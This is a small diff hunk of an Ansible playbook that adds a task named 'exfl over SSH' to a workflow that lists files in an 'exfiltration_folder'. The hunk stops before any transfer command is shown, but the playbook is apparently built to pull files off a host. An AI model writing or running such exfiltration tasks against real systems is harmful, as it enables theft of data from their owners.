@@ -21,7 +21,8 @@
       args:
         chdir: "{{ exfiltration_folder }}"
       register: exfil_files_list
-     
+    - name: exfl over SSH
+      tags: always 
       shell: |
         pwd > /tmp/path
         cd {{ exfiltration_folder }}
